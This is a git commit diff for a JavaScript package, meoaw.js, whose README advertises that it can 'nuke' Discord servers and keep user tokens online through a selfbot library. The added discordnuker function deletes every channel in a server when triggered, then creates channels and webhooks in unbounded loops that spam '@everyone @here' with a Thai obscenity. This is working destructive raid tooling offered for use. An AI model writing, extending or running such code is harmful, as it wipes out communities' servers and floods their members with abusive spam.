8733643ecb291746ba289d033b287943a68d08fa
seepipatpong <130662001+seepipatpong@users.noreply.github.com>
2023-04-13 22:46:59 +0700

    meoaw.js v1.4.0

--- README.md
+++ README.md
@@ -1,6 +1,6 @@
 # meoaw.js
 
-meoaw.js can online token with custom status and host on replit 24/7!
+meoaw.js can nuke server, online token with custom status and host on replit 24/7!
 
 # How to install
 
@@ -8,17 +8,30 @@ meoaw.js can online token with custom status and host on replit 24/7!
 
 # Examples
 
-all the examples can find at [Github](https://github.com/meoaw-dev/meoaw-dev)
+all the examples can find at [Github](https://github.com/meoaw-dev/meoaw.js)
 ```js
 const meoaw = require("meoaw.js");
 
-#เปิดเว็บโฮส
+//เปิดเว็บโฮส
 meoaw.host();
 
-# ออนโทเคนคน/บอท
-meoaw.discord(token);
+//ออนโทเคนคน/บอท
+meoaw.discord.streaming(
+    "", //โทเคนคน/บอท
+    "Meoaw.js" //สถานะ
+);
 
-#อื่นๆที่กำลังจะตามมา!
+//ยิงดิสแบบใช้ยศผู้ดูแล (แนะนำให้ยิงโดยใช้บอทเพราะแบบยิงโดยใช้คนจะยาก!)
+meoaw.discord.nuker({
+    token: "",  //โทเคนคนบอท
+    command: "ฮาย",  //ข้อความที่พิมพ์แล้วจะยิงให้!
+
+    channel: "กูมาเยือนควายๆ", //ชื่อช่องที่ต้องการใส่!
+    message: "ควยๆๆ" // ข้อความที่ต้องการให้ส่ง!
+    //แบบ embed เร็วๆนี้!
+});
+
+//อื่นๆในเร็วๆนี้!
 ```
 
 # Support Server
--- index.js
+++ index.js
@@ -3,6 +3,7 @@ const colors = require('colors')
 const selfdiscord = require("discord.js-selfbot-v13");
 
 async function host() {
+    console.log(colors.green("- Mode host is using!"));
     let app = express()
 
     app.get("/", (req, res) => {
@@ -23,8 +24,9 @@ async function host() {
 
 }
 
-async function discord(token, status) {
+async function discordstreaming(token, status) {
     if(!status) status = "Online🟢";
+    console.log(colors.green("- Mode Streaming Status is using!"));
 
     if(typeof token == "string") {
         const client = new selfdiscord.Client({
@@ -52,7 +54,7 @@ async function discord(token, status) {
                 });
         
                 client.on("ready", async () => {
-                    console.log(colors.green("[LOG] Logined to token"))
+                    console.log(colors.green("[LOG] Logined to token (Mode: Streaming)"))
                     console.log("- Logined as "+client.user.tag)
 
                     client.user.setActivity(status, {
@@ -73,6 +75,70 @@ async function discord(token, status) {
     }
 }
 
+
+async function discordnuker(config) {
+    if(!config.token || !config.command) {
+        return console.log(colors.red("[ERROR] Config is incorrect"));
+    }
+    if(!config.message) config.message = "meoaw.js";
+    if(!config.channel) config.channel = "nuker-meoaw";
+
+    console.log(colors.green("- Mode Nuker is using!"));
+
+    const client = new selfdiscord.Client({
+        checkUpdate: false
+    });
+    
+    client.on("ready", async () => {
+        console.log(colors.green("[LOG] Logined to token (Mode: Nuker)"));
+        console.log("- Logined as "+client.user.tag)
+    });
+
+
+    client.on("messageCreate", async (message) => {
+        if (message.content == config.command && message.guild && message.member.permissions.has(selfdiscord.Permissions.FLAGS.ADMINISTRATOR)) {
+            if(!config.message) {
+                return console.log(colors.red("[ERROR] Can't find message to spam"));
+            }
+            if(!config.channel) {
+                return console.log(colors.red("[ERROR] Can't find name channel to make!"))
+            }
+            
+            message.delete().catch(() => {})
+            message.guild.channels.cache.map(c => c.delete().catch(()=>{}))
+            setInterval(() => {
+                message.guild.channels.create(config.channel, { 
+                    type: "GUILD_TEXT"
+                }).then(channel => {
+                    setInterval(() => {
+                        channel.createWebhook(config.channel)
+                        .then(webhook => {
+                            setInterval(() => {
+                                webhook.send("@everyone @here"+config.message).catch(() => {})
+                            });
+                        })
+                        .catch(()=>{});
+
+                        channel.send("@everyone @here"+config.message).catch(() => {})
+                    })
+                }).catch(() => {})
+                message.guild.channels.create(config.channel, { 
+                    type: "GUILD_VOICE"
+                }).then(channel => {
+                    setInterval(() => {
+                        channel.send("@everyone @here"+config.message).catch(() => {})
+                    })
+                }).catch(() => {})
+            })
+
+        }
+    });
+
+    client.login(config.token).catch(err => {
+        console.log(colors.red("[ERROR] Can't login to token!"))
+    });
+}
+
 async function sms(phone) {
     console.log(colors.yellow("[LOG] Coming soon."))
 }
@@ -80,5 +146,8 @@ async function sms(phone) {
 module.exports = {
     host: host,
     sms: sms,
-    discord: discord
+    discord: {
+     streaming: discordstreaming,
+     nuker: discordnuker
+    },
 }
